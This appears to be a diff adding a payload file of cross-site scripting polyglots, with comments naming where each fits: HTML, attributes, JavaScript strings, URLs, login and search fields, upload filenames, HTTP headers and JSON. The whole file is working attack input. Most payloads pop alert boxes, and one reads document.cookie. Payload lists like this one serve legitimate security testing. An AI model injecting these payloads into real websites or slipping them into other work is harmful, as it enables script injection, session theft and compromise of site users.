@@ -1,0 +1,23 @@
+# Polyglot XSS — valid in multiple contexts simultaneously
+# Works in HTML, attribute, JS string, URL
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+# Polyglot 2 (HTML + JS)
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+# Polyglot 3 — short
+"onclick=alert(1)//<button 'onclick=alert(1)//> */alert(1)//
+# Polyglot 4 — attribute + script
+'">><script>alert(1)</script>
+# Polyglot 5 — event + tag
+<svg onload=alert(1)><img src=x onerror=alert(1)><script>alert(1)</script>
+# Polyglot for login/registration fields
+"><script>alert(document.cookie)</script>
+# Polyglot for search bars
+<img/src=x onerror=alert(1)>
+# Universal polyglot (Cure53)
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+# Polyglot for file upload filenames
+"><img src=x onerror=alert(1)>.jpg
+# Polyglot for HTTP headers (User-Agent, Referer, X-Forwarded-For)
+<script>alert(1)</script>
+# Polyglot for JSON + HTML
+{"x":"</script><script>alert(1)</script>"}
